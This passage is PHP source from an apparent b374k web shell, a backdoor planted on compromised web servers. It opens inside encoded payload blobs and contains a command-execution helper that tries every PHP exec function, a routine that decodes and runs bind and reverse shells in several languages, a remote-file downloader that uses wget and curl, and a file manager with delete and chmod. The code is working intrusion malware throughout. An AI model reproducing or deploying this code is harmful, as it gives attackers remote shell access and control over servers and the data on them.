cBCww8mbsA3pkNx2j3hxmgr3up9EprkHw==";
$s_sortable_js = "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";

// make link for folder $s_cwd and all of its parent folder
function swd($s_p){
	global $s_self;
	$s_ps = explode(DIRECTORY_SEPARATOR,$s_p);
	$s_pu = "";
	for($s_i = 0 ; $s_i < sizeof($s_ps)-1 ; $s_i++){
		$s_pz = "";
		for($s_j = 0 ; $s_j <= $s_i ; $s_j++) $s_pz .= $s_ps[$s_j].DIRECTORY_SEPARATOR;
		$s_pu .= "<a href='".$s_self."cd=".$s_pz."' onclick='return false;'>".$s_ps[$s_i]." ".DIRECTORY_SEPARATOR." </a>";
	}
	return trim($s_pu);
}
// htmlspecialchars, < > "
function hss($s_t){
	$s_n = array(">","<","\"");
	$s_y = array("&gt;", "&lt;", "&quot;");
	return str_replace($s_n,$s_y,$s_t);
}
// remove <br />tags
function rp($s_t){
	return trim(str_replace("<br />","",$s_t));
}
// replace spaces with underscore ( _ )
function cs($s_t){
	return str_replace(" ","_",$s_t);
}
// strip slashes,trim and urldecode
function ss($s_t){
	return (!get_magic_quotes_gpc())? trim(urldecode($s_t)) : trim(urldecode(stripslashes($s_t)));
}
// only strip slashes
function ssc($s_t){
	return (!get_magic_quotes_gpc())? trim($s_t) : trim(stripslashes($s_t));
}
// bind and reverse shell
function rs($s_rstype,$s_rstarget,$s_rscode){
	//bind_pl bind_py bind_rb bind_c bind_win bind_php back_pl back_py back_rb back_c back_win back_php
	//resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_c $s_rs_win $s_rs_php
	$s_result = "";
	$s_fpath = "";
	$s_fc = gzinflate(base64_decode($s_rscode));

	$s_errperm = "Directory ".getcwd().DIRECTORY_SEPARATOR." is not writable, please change to a writable one";
	$s_errgcc = "Unable to compile using gcc";

	$s_split = explode("_",$s_rstype);
	$s_method = $s_split[0];
	$s_lang = $s_split[1];
	if($s_lang=="py" || $s_lang=="pl" || $s_lang=="rb"){
		if($s_lang=="py") $s_runlang = "python";
		elseif($s_lang=="pl") $s_runlang = "perl";
		elseif($s_lang=="rb") $s_runlang = "ruby";
		$s_fpath = "b374k_rs.".$s_lang;
		if(is_file($s_fpath)) unlink($s_fpath);
		if($s_file=fopen($s_fpath,"w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(is_file($s_fpath)){
				$s_result = exe("chmod +x ".$s_fpath);
				$s_result = exe($s_runlang." ".$s_fpath." ".$s_rstarget);
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="c"){
		$s_fpath = "b374k_rs";
		if(is_file($s_fpath)) unlink($s_fpath);
		if(is_file($s_fpath.".c")) unlink($s_fpath.".c");
		if($s_file=fopen($s_fpath.".c","w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(is_file($s_fpath.".c")){
				$s_result = exe("gcc ".$s_fpath.".c -o ".$s_fpath);
				if(is_file($s_fpath)){
					$s_result = exe("chmod +x ".$s_fpath);
					$s_result = exe("./".$s_fpath." ".$s_rstarget);
				}
				else $s_result = $s_errgcc;
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="win"){
		$s_fpath = "b374k_rs.exe";
		if(is_file($s_fpath)) unlink($s_fpath);
		if($s_file=fopen($s_fpath,"w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(is_file($s_fpath)){
				$s_result = exe($s_fpath." ".$s_rstarget);
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="php"){
		$s_result = eval("?>".$s_fc);
	}
	if(is_file($s_fpath)) unlink($s_fpath);
	if(is_file($s_fpath.".c")) unlink($s_fpath.".c");
	return $s_result;
}
// format bit
function ts($s_s){
	if($s_s<=0) return 0;
	$s_w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$s_e = floor(log($s_s)/log(1024));
	return sprintf('%.2f '.$s_w[$s_e], ($s_s/pow(1024, floor($s_e))));
}
// get file size
function gs($s_f){
	$s_s = @filesize($s_f);
	if($s_s !== false){
		if($s_s<=0) return 0;
		return ts($s_s);
	}
	else return "???";
}
// get file permissions
function gp($s_f){
	if($s_m=@fileperms($s_f)){
		$s_p = 'u';
		if(($s_m & 0xC000) == 0xC000)$s_p = 's';
		elseif(($s_m & 0xA000) == 0xA000)$s_p = 'l';
		elseif(($s_m & 0x8000) == 0x8000)$s_p = '-';
		elseif(($s_m & 0x6000) == 0x6000)$s_p = 'b';
		elseif(($s_m & 0x4000) == 0x4000)$s_p = 'd';
		elseif(($s_m & 0x2000) == 0x2000)$s_p = 'c';
		elseif(($s_m & 0x1000) == 0x1000)$s_p = 'p';
		$s_p .= ($s_m & 00400) ? 'r' : '-';
		$s_p .= ($s_m & 00200) ? 'w' : '-';
		$s_p .= ($s_m & 00100) ? 'x' : '-';
		$s_p .= ($s_m & 00040) ? 'r' : '-';
		$s_p .= ($s_m & 00020) ? 'w' : '-';
		$s_p .= ($s_m & 00010) ? 'x' : '-';
		$s_p .= ($s_m & 00004) ? 'r' : '-';
		$s_p .= ($s_m & 00002) ? 'w' : '-';
		$s_p .= ($s_m & 00001) ? 'x' : '-';
		return $s_p;
	}
	else return "???????????";
}
// shell command
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('shell_exec')){
		$s_out = @shell_exec($s_c);
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('exec')) {
		@exec($s_c,$s_r);
		if(!empty($s_r)) foreach($s_r as $s_s) $s_out .= $s_s;
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('proc_open')) {
		$s_descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
		);
		$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
		if (is_resource($s_proc)) {
			while ($s_si = fgets($s_pipes[1])) {
				if(!empty($s_si)) $s_out .= $s_si;
			}
			while ($s_se = fgets($s_pipes[2])) {
				if(!empty($s_se)) $s_out .= $s_se;
			}
		}
		@proc_close($s_proc);
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('popen')){
		$s_f = @popen($s_c, 'r');
		if($s_f){
			while(!feof($s_f)){
				$s_out .= fread($s_f, 2096);
			}
			pclose($s_f);
		}
		if(!empty($s_out)) return $s_out;
	}
	return "";
}
// add slash to the end of given path
function cp($s_p){
	if(is_dir($s_p)){
		$s_x = DIRECTORY_SEPARATOR;
		while(substr($s_p,-1) == $s_x) $s_p = rtrim($s_p,$s_x);
		return $s_p.$s_x;
	}
	return $s_p;
}
// delete dir and all of its content (no warning !) xp
function rmdirs($s_d){
	$s_f = glob($s_d . '*', GLOB_MARK);
	foreach($s_f as $s_z){
		if(is_dir($s_z)) rmdirs($s_z);
		else unlink($s_z);
	}
	if(is_dir($s_d)) rmdir($s_d);
}
// get array of all files from given directory
function getallfiles($s_dir){
    $s_f = glob($s_dir . '*');
	for($s_i = 0; $s_i < count($s_f); $s_i++){
		if(is_dir($s_f[$s_i])) {
			$s_a = glob($s_f[$s_i].DIRECTORY_SEPARATOR.'*');
			$s_f = array_merge($s_f, $s_a);
		}
	}
    return $s_f;
}
// which command
function xwhich($s_pr){
	$s_p = exe("which $s_pr");
	if(trim($s_p)!="") { return trim($s_p); } else { return trim($s_pr); }
}
// download file from internet
function dlfile($s_u,$s_p){
	$s_n = basename($s_u);

	// try using php functions
	if($s_t = @file_get_contents($s_u)){
		if(is_file($s_p)) unlink($s_p);;
		if($s_f=fopen($s_p,"w")){
			fwrite($s_f,$s_t);
			fclose($s_f);
			if(is_file($s_p)) return true;
		}
	}
	// using wget
	exe(xwhich('wget')." ".$s_u." -O ".$s_p);
	if(is_file($s_p)) return true;

	// try using lwp-download
	exe(xwhich('lwp-download')." ".$s_u." ".$s_p);
	if(is_file($s_p)) return true;

	// try using lynx
	exe(xwhich('lynx')." -source ".$s_u." > ".$s_p);
	if(is_file($s_p)) return true;

	// try using curl
	exe(xwhich('curl')." ".$s_u." -o ".$s_p);
	if(is_file($s_p)) return true;

	return false;
}
// find writable dir
function get_writabledir(){
	if(is_writable(".")) $s_d = ".".DIRECTORY_SEPARATOR;
	else{
		if(!$s_d = getenv("TMP")) if(!$s_d = getenv("TEMP")) if(!$s_d = getenv("TMPDIR")){
			if(is_writable("/tmp")) $s_d = "/tmp/";
			else $s_d = getcwd().DIRECTORY_SEPARATOR;
		}
	}
	return $s_d;
}
// zip function
function zip($s_src, $s_dest){
	if(!extension_loaded('zip') || !file_exists($s_src)) return false;

	if(class_exists("ZipArchive")){
		$s_zip = new ZipArchive();
		if(!$s_zip->open($s_dest, 1)) return false;

		$s_src = str_replace('\\', '/', $s_src);
		if(is_dir($s_src)){
			$s_files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s_src), 1);
			foreach($s_files as $s_file){
				$s_file = str_replace('\\', '/', $s_file);
				if(in_array(substr($s_file, strrpos($s_file, '/')+1), array('.', '..'))) continue;
				if (is_dir($s_file) === true)	$s_zip->addEmptyDir(str_replace($s_src . '/', '', $s_file . '/'));
				else if (is_file($s_file) === true) $s_zip->addFromString(str_replace($s_src . '/', '', $s_file), @file_get_contents($s_file));
			}
		}
		elseif(is_file($s_src) === true) $s_zip->addFromString(basename($s_src), @file_get_contents($s_src));
		$s_zip->close();
		return true;
	}
}
// check shell permission to access program
function check_access($s_lang){
	$s_s = 0;
	switch($s_lang){
		case "python":
			$s_cek = strtolower(exe("python -h"));
			if(strpos($s_cek,"usage")!==false) $s_s = 1;
			break;
		case "perl":
			$s_cek = strtolower(exe("perl -h"));
			if(strpos($s_cek,"usage")!==false) $s_s = 1;
			break;
		case "ruby":
			$s_cek = strtolower(exe("ruby -h"));
			if(strpos($s_cek,"usage")!==false) $s_s = 1;
			break;
		case "gcc":
			$s_cek = strtolower(exe("gcc --help"));
			if(strpos($s_cek,"usage")!==false) $s_s = 1;
			break;
		case "tar":
			$s_cek = strtolower(exe("tar --help"));
			if(strpos($s_cek,"usage")!==false) $s_s = 1;
			break;
		case "java":
			$s_cek = strtolower(exe("javac --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_cek = strtolower(exe("java -h"));
				if(strpos($s_cek,"usage")!==false) $s_s = 1;
			}
			break;
	}
	return $s_s;
}
// find available archiver
function get_archiver_available(){
	global $s_self, $s_tar;
	$s_dlfile = "";
	$s_avail_arc = array("raw" => "raw");

	if(class_exists("ZipArchive")){
		$s_avail_arc["ziparchive"] = "zip";
	}
	if($s_tar){
		$s_avail_arc["tar"] = "tar";
		$s_avail_arc["targz"] = "tar.gz";
	}

	$s_option_arc = "";
	foreach($s_avail_arc as $s_t => $s_u){
		$s_option_arc .= "<option value=\"".$s_t."\">".$s_u."</option>";
	}

	$s_dlfile .= "<form action='".$s_self."' method='post'>
				<select onchange='download(this);' name='dltype' class='inputzbut' style='width:80px;height:20px;'>
				<option value='' disabled selected>Download</option>
				".$s_option_arc."
				</select>
				<input type='hidden' name='dlpath' value='__dlpath__' />
				</form>
				";
	return $s_dlfile;
}
// explorer, return a table of given dir
function showdir($s_cwd){
	global $s_self;

	$s_posix = (function_exists("posix_getpwuid") && function_exists("posix_getgrgid"))? true : false;
	$s_win = (strtolower(substr(php_uname(),0,3)) == "win")? true : false;

	$s_fname = array();
	$s_dname = array();

	if(function_exists("scandir") && $s_dh = @scandir($s_cwd)){
		foreach($s_dh as $s_file){
			if(is_dir($s_file)) $s_dname[] = $s_file;
			elseif(is_file($s_file)) $s_fname[] = $s_file;
		}
	}
	else{
		if($s_dh = @opendir($s_cwd)){
			while($s_file = readdir($s_dh)){
				if(is_dir($s_file)) $s_dname[] = $s_file;
				elseif(is_file($s_file))$s_fname[] = $s_file;
			}
			closedir($s_dh);
		}
	}

	sort($s_fname);
	sort($s_dname);
	$s_list = array_merge($s_dname,$s_fname);

	if($s_win){
		//check if this root directory
		chdir("..");
		if(cp(getcwd())==cp($s_cwd)){
			array_unshift($s_list, ".");
		}
		chdir($s_cwd);
	}

	$s_path = explode(DIRECTORY_SEPARATOR,$s_cwd);
	$s_tree = sizeof($s_path);

	$s_parent = "";
	if($s_tree > 2) for($s_i=0;$s_i<$s_tree-2;$s_i++) $s_parent .= $s_path[$s_i].DIRECTORY_SEPARATOR;
	else $s_parent = $s_cwd;

	$s_owner_html = (!$s_win && $s_posix) ? "<th style='width:140px;'>owner:group</th>" : "";
	$s_colspan = (!$s_win && $s_posix) ? "6" : "5";
	$s_buff = "
	<table class='explore sortable'>
	<tr><th style='width:24px;' class='sorttable_nosort'></th><th>name</th><th style='width:60px;'>size</th>".$s_owner_html."<th style='width:70px;'>perms</th><th style='width:130px;'>modified</th><th style='width:170px;' class='sorttable_nosort'>action</th><th style='width:90px;' class='sorttable_nosort'>download</th></tr>
	";

	$s_arc = get_archiver_available();
	foreach($s_list as $s_l){
		if(!$s_win && $s_posix){
			$s_name = posix_getpwuid(fileowner($s_l));
			$s_group = posix_getgrgid(filegroup($s_l));
			$s_owner = $s_name['name']."<span class='gaya'>:</span>".$s_group['name'];
			$s_owner_html = "<td style='text-align:center;'>".$s_owner."</td>";
		}

		$s_lhref = "";
		$s_lname = "";
		$s_laction = "";
		if(is_dir($s_l)){
			if($s_l=="."){
				$s_lhref = $s_self."cd=".$s_cwd;
				$s_lsize = "LINK";
				$s_laction = "
				<span id='titik1'>
					<a href='".$s_self."cd=".$s_cwd."&find=".$s_cwd."' title='find something' onclick='return false;'>find</a> |
					<a href='".$s_self."cd=".$s_cwd."&x=upload' title='upload' onclick='return false;'>upl</a> |
					<a href='".$s_self."cd=".$s_cwd."&edit=".$s_cwd."newfile_1&new=yes' title='create new file' onclick='return false;'>+file</a> |
					<a href=\"javascript:tukar('titik1','titik1_form');\" title='create new directory'>+dir</a>
				</span>
				<div id='titik1_form' class='sembunyi'>
					<form action='".$s_self."' method='post'>
					<input type='hidden' name='cd' value='".$s_cwd."' />
					<input class='inputz' id='titik1_' style='width:80px;' type='text' name='mkdir' value='newfolder_1' />
					<input class='inputzbut' type='submit' name='rename' style='width:35px;' value='Go !' />
					</form>
					<input class='inputzbut' type='button' value='x' onclick=\"tukar('titik1_form','titik1');\" />
				</div>";
			}
			elseif($s_l==".."){
				$s_lhref = $s_self."cd=".$s_parent;
				$s_lsize = "LINK";
				$s_laction = "
				<span id='titik2'>
					<a href='".$s_self."cd=".$s_parent."&find=".$s_parent."' title='find something' onclick='return false;'>find</a> |
					<a href='".$s_self."cd=".$s_parent."&x=upload' title='upload' onclick='return false;'>upl</a> |
					<a href='".$s_self."cd=".$s_parent."&edit=".$s_parent."newfile_1&new=yes' title='create new file' onclick='return false;'>+file</a> |
					<a href=\"javascript:tukar('titik2','titik2_form');\" title='create new directory'>+dir</a>
				</span>
				<div id='titik2_form' class='sembunyi'>
					<form action='".$s_self."' method='post'>
					<input type='hidden' name='cd' value='".$s_parent."' />
					<input class='inputz' id='titik2_' style='width:80px;' type='text' name='mkdir' value='newfolder_1' />
					<input class='inputzbut' type='submit' name='rename' style='width:35px;' value='Go !' />
					</form>
					<input class='inputzbut' type='button' value='x' onclick=\"tukar('titik2_form','titik2');\" />
				</div>";
			}
			else{
				$s_lhref = $s_self."cd=".$s_cwd.$s_l.DIRECTORY_SEPARATOR;
				$s_lsize = "DIR";
				$s_laction = "
				<span id='".cs($s_l)."_link'>
					<a href='".$s_self."cd=".$s_cwd.$s_l.DIRECTORY_SEPARATOR."&find=".$s_cwd.$s_l.DIRECTORY_SEPARATOR."' title='find something' onclick='return false;'>find</a> |
					<a href='".$s_self."cd=".$s_cwd.$s_l.DIRECTORY_SEPARATOR."&x=upload' title='upload' onclick='return false;'>upl</a> |
					<a href=\"javascript:tukar('".cs($s_l)."_link','".cs($s_l)."_form');\" title='rename'>ren</a> |
					<a href='".$s_self."cd=".$s_cwd."&del=".$s_l."' title='delete' onclick='return false;'>del</a>
				</span>
				<div id='".cs($s_l)."_form' class='sembunyi'>
					<form action='".$s_self."' method='post'>
					<input type='hidden' name='oldname' value='".$s_l."' />
					<input type='hidden' name='cd' value='".$s_cwd."' />
					<input class='inputz' style='width:80px;' type='text' id='".cs($s_l)."_link_' name='newname' value='".$s_l."' />
					<input class='inputzbut' type='submit' name='rename' value='ren' />
					</form>
					<input class='inputzbut' type='button' value='x' onclick=\"tukar('".cs($s_l)."_form','".cs($s_l)."_link');\" />
				</div>";
			}
			$s_lname = "[ ".$s_l." ]";
			$s_lsizetit = "0";
		}
		else{
			$s_lhref = $s_self."view=".$s_l;
			$s_lname = $s_l;
			$s_lsize = gs($s_l);
			$s_lsizetit = @filesize($s_l);
			$s_laction = "
			<div id='".cs($s_l)."_form' class='sembunyi'>
				<form action='".$s_self."' method='post'>
				<input type='hidden' name='oldname' value='".$s_l."' />
				<input class='inputz' style='width:80px;' type='text' id='".cs($s_l)."_link_' name='newname' value='".$s_l."' />
				<input class='inputzbut' type='submit' name='rename' value='ren' />
				</form>
				<input class='inputzbut' type='button' value='x' onclick=\"tukar('".cs($s_l)."_form','".cs($s_l)."_link');\" />
			</div>
			<span id='".cs($s_l)."_link'>
				<a href='".$s_self."edit=".cs($s_cwd.$s_l)."' title='edit' onclick='return false;'>edit</a> |
				<a href='".$s_self."hexedit=".cs($s_cwd.$s_l)."' title='edit as hex' onclick='return false;'>hex</a> |
				<a href=\"javascript:tukar('".cs($s_l)."_link','".cs($s_l)."_form');\" title='rename'>ren</a> |
				<a href='".$s_self."del=".$s_l."' title='delete' onclick='return false;'>del</a>
			</span>";
		}

		if(($s_l!='.')&&($s_l!='..')){
			$s_cboxes = "<input id='".md5($s_lhref)."' name='cbox' value='".$s_cwd.$s_l."' type='checkbox' class='css-checkbox' onchange='hilite(this);' />
						<label for='".md5($s_lhref)."' class='css-label'></label>
						";
		}
		else $s_cboxes = "~";
		$s_ldl = str_replace("__dlpath__",$s_l,$s_arc);
		$s_buff .= "
		<tr>
		<td style='text-align:center;text-indent:4px;'>".$s_cboxes."</td>
		<td class='explorelist' ondblclick=\"return go('".addslashes($s_lhref)."',event);\">
			<a href='".$s_lhref."' onclick='return false;'>".$s_lname."</a>
		</td>
		<td title='".$s_lsizetit."'>".$s_lsize."</td>
		".$s_owner_html."
		<td style='text-align:center;'>".gp($s_l)."</td>
		<td style='text-align:center;'>".@date("d-M-Y H:i:s",filemtime($s_l))."</td>
		<td>".$s_laction."</td>
		<td>".$s_ldl."</td></tr>";
	}

	$s_buff .= "<tr style='background:#181818;'><td style='text-align:center;border-top:3px solid #222;text-indent:4px;'>
			<form action='".$s_self."' method='post'>
			<input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();' />
			<label for='checkalll' class='css-label'></label>
			</td><td style='border-top:3px solid #222;'>
			<select id='massact' class='inputzbut' onchange='massactgo();' style='width:100%;height:20px;margin:0;'>
				<option value='' disabled selected>Action</option>
				<option value='cut'>cut</option>
				<option value='copy'>copy</option>
				<option value='paste'>paste</option>
				<option value='delete'>delete</option>
				<option value='' disabled>-</option>
				<option value='chmod'>chmod</option>
				<option value='touch'>touch</option>
			</select>
			</td><td colspan='".$s_colspan."'><noscript><input type='button' value='Go !' class='inputzbut' onclick='massactgo();' /></noscript></td>
			</form>
			</td>
			</tr>
			</table>
			";
	return $s_buff;
}
//database related functions
function sql_connect($s_sqltype, $s_sqlhost, $s_sqluser, $s_sqlpass){
	if($s_sqltype == 'mysql'){if(function_exists('mysql_connect')) return @mysql_connect($s_sqlhost,$s_sqluser,$s_sqlpass);}
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_connect')) return @mssql_connect($s_sqlhost,$s_sqluser,$s_sqlpass);
		elseif(function_exists('sqlsrv_connect')){
			$s_coninfo = array("UID"=>$s_sqluser, "PWD"=>$s_sqlpass);
			return @sqlsrv_connect($s_sqlhost,$s_coninfo);
		}
	}
	elseif($s_sqltype == 'pgsql'){
		$s_hosts = explode(":", $s_sqlhost);
		if(count($s_hosts)==2){
			$s_host_str = "host=".$s_hosts[0]." port=".$s_hosts[1];
		}
		else $s_host_str = "host=".$s_sqlhost;
		if(function_exists('pg_connect')) return @pg_connect("$s_host_str user=$s_sqluser password=$s_sqlpass");
	}
	elseif($s_sqltype == 'oracle'){if(function_exists('oci_connect')) return @oci_connect($s_sqluser,$s_sqlpass,$s_sqlhost);}
	elseif($s_sqltype == 'sqlite3'){
		if(class_exists('SQLite3')) if(!empty($s_sqlhost)) return new SQLite3($s_sqlhost);
		else return false;
	}
	elseif($s_sqltype == 'sqlite'){if(function_exists('sqlite_open')) return @sqlite_open($s_sqlhost);}
	elseif($s_sqltype == 'odbc'){if(function_exists('odbc_connect')) return @odbc_connect($s_sqlhost,$s_sqluser,$s_sqlpass);}
	elseif($s_sqltype == 'pdo'){
		if(class_exists('PDO')) if(!empty($s_sqlhost)) return new PDO($s_sqlhost,$s_sqluser,$s_sqlpass);
		else return false;
	}
}
function sql_query($s_sqltype, $s_query, $s_con){
	if($s_sqltype == 'mysql'){if(function_exists('mysql_query')) return mysql_query($s_query);}
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_query')) return mssql_query($s_query);
		elseif(function_exists('sqlsrv_query')) return sqlsrv_query($s_con,$s_query);
	}
	elseif($s_sqltype == 'pgsql'){if(function_exists('pg_query')) return pg_query($s_query);}
	elseif($s_sqltype == 'oracle'){
		if(function_exists('oci_parse') && function_exists('oci_execute')){
			$s_st = oci_parse($s_con, $s_query);
			oci_execute($s_st);
			return $s_st;
		}
	}
	elseif($s_sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $s_con->query($s_query);}
	elseif($s_sqltype == 'sqlite'){if(function_exists('sqlite_query')) return sqlite_query($s_con, $s_query);}
	elseif($s_sqltype == 'odbc'){if(function_exists('odbc_exec')) return odbc_exec($s_con, $s_query);}
	elseif($s_sqltype == 'pdo'){if(class_exists('PDO')) return $s_con->query($s_query);}
}
function sql_num_fields($s_sqltype, $s_hasil){
	if($s_sqltype == 'mysql'){if(function_exists('mysql_num_fields')) return mysql_num_fields($s_hasil);}
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_num_fields')) return mssql_num_fields($s_hasil);
		elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($s_hasil);
	}
	elseif($s_sqltype == 'pgsql'){if(function_exists('pg_num_fields')) return pg_num_fields($s_hasil);}
	elseif($s_sqltype == 'oracle'){if(function_exists('oci_num_fields')) return oci_num_fields($s_hasil);}
	elseif($s_sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $s_hasil->numColumns();}
	elseif($s_sqltype == 'sqlite'){if(function_exists('sqlite_num_fields')) return sqlite_num_fields($s_hasil);}
	elseif($s_sqltype == 'odbc'){if(function_exists('odbc_num_fields')) return odbc_num_fields($s_hasil);}
	elseif($s_sqltype == 'pdo'){if(class_exists('PDO')) return $s_hasil->columnCount();}
}
function sql_field_name($s_sqltype,$s_hasil,$s_i){
	if($s_sqltype == 'mysql'){if(function_exists('mysql_field_name')) return mysql_field_name($s_hasil,$s_i);}
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_field_name')) return mssql_field_name($s_hasil,$s_i);
		elseif(function_exists('sqlsrv_field_metadata')){
			$s_metadata = sqlsrv_field_metadata($s_hasil);
			if(is_array($s_metadata)){
				$s_metadata=$s_metadata[$s_i];
			}
			if(is_array($s_metadata)) return $s_metadata['Name'];
		}
	}
	elseif($s_sqltype == 'pgsql'){if(function_exists('pg_field_name')) return pg_field_name($s_hasil,$s_i);}
	elseif($s_sqltype == 'oracle'){if(function_exists('oci_field_name')) return oci_field_name($s_hasil,$s_i+1);}
	elseif($s_sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $s_hasil->columnName($s_i);}
	elseif($s_sqltype == 'sqlite'){if(function_exists('sqlite_field_name')) return sqlite_field_name($s_hasil,$s_i);}
	elseif($s_sqltype == 'odbc'){if(function_exists('odbc_field_name')) return odbc_field_name($s_hasil,$s_i+1);}
	elseif($s_sqltype == 'pdo'){
		if(class_exists('PDO')){
			$s_res = $s_hasil->getColumnMeta($s_i);
